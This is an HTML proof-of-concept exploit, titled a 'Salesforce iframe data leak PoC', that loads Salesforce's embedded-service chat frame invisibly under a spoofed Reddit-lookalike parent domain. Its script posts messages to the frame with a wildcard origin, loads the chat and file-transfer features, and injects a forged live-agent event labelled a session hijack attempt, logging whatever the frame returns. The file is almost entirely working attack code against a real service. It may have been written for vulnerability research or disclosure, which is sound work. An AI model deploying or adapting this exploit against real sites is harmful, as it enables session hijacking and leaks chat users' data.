<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Salesforce iframe data leak PoC</title>
  <style>
    body { font-family: sans-serif; background: #111; color: #0f0; padding: 1em; }
    iframe { width: 1px; height: 1px; opacity: 0; position: absolute; }
  </style>
</head>
<body>
  <h2>âœ… Waiting for iframe to respond...</h2>

  <iframe id="eswFrame"
    src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://reddit.com.wangdubruh.xyz"
    allow="camera *; microphone *;"></iframe>

  <script>
    const iframe = document.getElementById("eswFrame");
    let featuresLoaded = false;

    window.addEventListener("message", (e) => {
      const data = e.data;
      if (!data || typeof data !== "object") return;

      // Log every message
      console.log("ðŸ“© Message from iframe:", data);

      // Step 1: iframe has initialized
      if (data.method === "session.onLoad" && !featuresLoaded) {
        console.log("[+] Iframe loaded (Salesforce 4.0)");
        featuresLoaded = true;

        // Load required features
        ["chasitor", "filetransfer"].forEach(feature => {
          console.log(`ðŸ“¤ Sending script.load for feature: '${feature}'`);
          iframe.contentWindow.postMessage({ method: "script.load", feature }, "*");
        });

        // Delay sending the fake message
        setTimeout(() => {
          console.log("ðŸ“¤ Sending fake liveagent.event to iframe");
          iframe.contentWindow.postMessage({
            method: "liveagent.event",
            data: {
              event: "chasitorDataDump",
              params: { key: "POC", value: "Session hijack attempt" }
            }
          }, "*");
        }, 2000);
      }

      // Step 2: Response from Salesforce
      if (data.method === "liveagent.event") {
        console.log("ðŸ“© Received internal event response:");
        console.log(JSON.stringify(data, null, 2));
      }
    });
  </script>
</body>
</html>
